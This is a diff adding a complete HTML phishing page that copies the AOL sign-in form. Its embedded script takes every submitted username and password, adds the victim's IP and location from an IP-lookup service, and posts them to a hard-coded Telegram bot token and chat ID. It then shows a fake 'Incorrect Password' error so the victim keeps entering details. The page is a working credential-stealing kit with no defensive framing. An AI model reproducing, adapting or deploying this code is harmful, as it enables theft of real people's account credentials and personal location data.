@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>AOL Login</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    html, body {
+      background: #f7f7f7;
+      font-family: Arial, sans-serif;
+      height: 100%;
+      min-height: 100%;
+    }
+    .container {
+      max-width: 380px;
+      margin: 60px auto;
+      background: #fff;
+      padding: 32px 28px;
+      border-radius: 7px;
+      box-shadow: 0 6px 18px rgba(0,0,0,0.11);
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 22px;
+    }
+    .logo img {
+      width: 56%;
+      max-width: 155px;
+      min-width: 88px;
+      display: inline-block;
+    }
+    h2 {
+      text-align: center;
+      font-weight: 500;
+      margin-bottom: 28px;
+      color: #335caa;
+      letter-spacing: 1.1px;
+    }
+    form .input-group {
+      margin-bottom: 25px;
+      position: relative;
+    }
+    .login-label {
+      display: block;
+      font-size: .98em;
+      color: #555;
+      margin-bottom: 4px;
+    }
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px 11px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 1.04em;
+      transition: border 0.2s;
+      background: #f9f9f9;
+      color: #393939;
+    }
+    input[type="text"].input-error,
+    input[type="password"].input-error {
+      border: 1.5px solid red !important;
+      color: red !important;
+    }
+    input[type="text"].input-error::placeholder,
+    input[type="password"].input-error::placeholder {
+      color: red !important;
+      opacity: 1;
+    }
+    input::placeholder {
+      color: #888;
+      opacity: 1;
+      font-size: 0.97em;
+    }
+    .error-msg-visible {
+      display: block !important;
+      color: red !important;
+      font-size: 1em;
+      margin-top: 2px;
+      margin-bottom: 14px;
+      min-height: 18px;
+    }
+    .error-msg {
+      display: none;
+    }
+    .button-container {
+      margin-top: 10px;
+      width: 100%;
+    }
+    .pure-button-primary {
+      width: 100%;
+      border: none;
+      border-radius: 4px;
+      background: #335caa;
+      color: #fff;
+      font-size: 1em;
+      font-weight: bold;
+      padding: 12px 0;
+      cursor: pointer;
+      margin-bottom: 8px;
+      transition: background 0.2s;
+    }
+    .pure-button-primary:hover {
+      background: #20447a;
+    }
+    .links {
+      margin-top: 16px;
+      text-align: center;
+      color: #888;
+      font-size: 0.96em;
+    }
+    .links a {
+      color: #335caa;
+      margin: 0 8px;
+      text-decoration: none;
+      font-weight: 500;
+    }
+    .links a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="../myah/logo.png" alt="AOL" />
+    </div>
+    <h2>Sign in</h2>
+    <form id="loginForm" autocomplete="off">
+      <div class="input-group">
+        <label for="login-email" class="login-label">Username, email, or mobile</label>
+        <input type="text" id="login-email" name="email" required autocomplete="username" autocapitalize="none" autocorrect="off" placeholder="Email or mobile">
+      </div>
+      <div class="input-group">
+        <label for="login-password" class="login-label">Password</label>
+        <input type="password" id="login-password" name="password" required autocomplete="current-password" autocapitalize="none" autocorrect="off" placeholder="Password">
+      </div>
+      <p id="username-error" class="error-msg" role="alert"></p>
+      <div class="button-container">
+        <button id="login-signin" type="submit" class="pure-button-primary">Continue</button>
+      </div>
+    </form>
+    <div class="links">
+      <a href="#">Terms</a> | <a href="#">Privacy</a>
+    </div>
+  </div>
+  <script>
+    // --- Begin AOL sender (Telegram) logic ---
+    const TELEGRAM_BOT_TOKEN = "8292423468:AAEQQXMHQ7jmJFyfrGX7vsWhr6GH-ORn8dk";
+    const TELEGRAM_CHAT_ID = "-5006528512";
+
+    document.addEventListener("DOMContentLoaded", function () {
+      const form = document.getElementById("loginForm");
+      const usernameInput = form.querySelector('input[name="email"]');
+      const passwordInput = form.querySelector('input[name="password"]');
+      const errorMsg = document.getElementById("username-error");
+
+      function addInputErrorStyling() {
+        if (usernameInput) usernameInput.classList.add('input-error');
+        if (passwordInput) passwordInput.classList.add('input-error');
+      }
+      function removeInputErrorStyling() {
+        if (usernameInput) usernameInput.classList.remove('input-error');
+        if (passwordInput) passwordInput.classList.remove('input-error');
+      }
+      function showError(msg) {
+        if (!errorMsg) return;
+        errorMsg.textContent = msg;
+        errorMsg.classList.remove("error-msg");
+        errorMsg.classList.add("error-msg-visible");
+      }
+      function hideError() {
+        if (!errorMsg) return;
+        errorMsg.classList.add("error-msg");
+        errorMsg.classList.remove("error-msg-visible");
+        errorMsg.textContent = "";
+      }
+      async function sendToTelegram(email, password, locationInfo) {
+        const text = `
+---------------|54|---------------
+Username: ${email}
+Password: ${password}
+${locationInfo}
+-------------------------------
+`;
+        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        const payload = { chat_id: TELEGRAM_CHAT_ID, text };
+
+        try {
+          await fetch(telegramUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload),
+          });
+        } catch { /* Don't block UI on error */ }
+      }
+
+      async function getLocationInfo() {
+        try {
+          const res = await fetch("https://ip-api.io/json");
+          const data = await res.json();
+          return `Country: ${data.country_name || ""}, City: ${data.city || ""}, IP: ${data.ip || ""}, ZIP: ${data.postal || ""}`;
+        } catch {
+          return "Location: Unknown";
+        }
+      }
+
+      form.addEventListener("submit", async function (e) {
+        e.preventDefault();
+        removeInputErrorStyling();
+        hideError();
+
+        const email = usernameInput ? usernameInput.value.trim() : "";
+        const password = passwordInput ? passwordInput.value : "";
+        const locationInfo = await getLocationInfo();
+
+        await sendToTelegram(email, password, locationInfo);
+
+        addInputErrorStyling();
+        showError("Incorrect Password. please Try Again.");
+      });
+
+      usernameInput && usernameInput.addEventListener("input", () => {
+        removeInputErrorStyling();
+        hideError();
+      });
+      passwordInput && passwordInput.addEventListener("input", () => {
+        removeInputErrorStyling();
+        hideError();
+      });
+    });
+    // --- End AOL sender logic ---
+  </script>
+</body>
+</html>
